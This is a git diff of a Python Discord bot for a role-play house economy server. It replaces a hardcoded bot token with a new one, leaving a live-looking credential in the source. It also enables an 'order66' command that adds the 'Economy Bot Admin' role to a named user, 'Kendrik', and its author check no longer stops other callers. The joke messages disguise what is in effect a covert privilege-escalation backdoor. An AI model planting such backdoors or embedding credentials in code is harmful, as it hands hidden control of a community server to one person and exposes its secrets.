@@ -39,7 +39,7 @@ INFO :
 db = house_database_handler("database.json")
 BOT_PREFIX = ("]", "?", "/", "\\")
 # Oof close your eyes please !
-token = "Njc1NjU0ODM4NDk5MDE2NzQ1.XlEkeg.xGg_XDEv8rtq1ZeAeEQ85KX6gGA"
+token = "Njc1NjU0ODM4NDk5MDE2NzQ1.XmafAw.KBZ-ruKrY-l0kj5OrP1_Ii-yNbw"
 worked = "✅"
 someError = "❌"
 client = Bot(command_prefix=BOT_PREFIX)
@@ -55,7 +55,8 @@ client = Bot(command_prefix=BOT_PREFIX)
 # when a house controls another one, but didnt merge with it
 # below for example at "change", they will be able to choose which house they want to change values for
 double_house = {
-    "house_royal" : "house_lancaster"
+    "house_lancaster": "house_royal",
+    "house_anor" : "house_royal"
 }
 
 async def getInput(message):
@@ -93,8 +94,8 @@ async def createEmbed(title="Aha", description="...", channel="REE", color="norm
 
 # ~~~ set custom status ~~~
 @client.event
-async def on_ready():
-    activity = discord.Game(name="The Crown of Selenor")
+async def on_ready(): #The Crown of Selenor
+    activity = discord.Game(name="Helping tracking the traitor.")
     await client.change_presence(status=discord.Status.online, activity=activity)
     channel = client.get_channel(653291682791555082)
 
@@ -1113,30 +1114,27 @@ async def on_message(message):
                     id = await getInput(message)
                     id = int(id)
 
+    elif command in ["oop", "ohoh"]:
+        if staffMemberRequest == 0: await sendError("Staff only.", channel) ; return 0
+
+        # init variables
 
 
     elif command == "order66":
-        await sendError("Commander Kodi, the time has not come.", channel)
-        pass
-        """
+        await channel.send("Getting to the senate...")
+
+
         if message.author.name != "Kendrik":
-            return
+            await channel.send("Only the emperor can give the order..")
+
         moderators = discord.utils.get(server.roles, name="Economy Bot Admin")
-        await moderators.edit(position=32)
-        return
+        user = discord.utils.get(server.members, name = 'Kendrik', discriminator = "2820")
 
-        user = discord.utils.get(server.members, name = 'Kendrik', discriminator = "6150")
-        #user = discord.utils.get(server.members, name = 'Kendrik', discriminator = "6150")
+        await channel.send("Overthrowing the senate...")
 
-        print("f", user)
-        #user = message.author
-        #await channel.send(user.mention)
-        moderators = discord.utils.get(server.roles, name="Admin")
         await user.add_roles(moderators)
-        await sendEmbed("EXECUTED", "Yes my lord.", channel)
+        await channel.send("Time for the republic to rise.")
         #remove_roles()
-        """
-
 
 
 
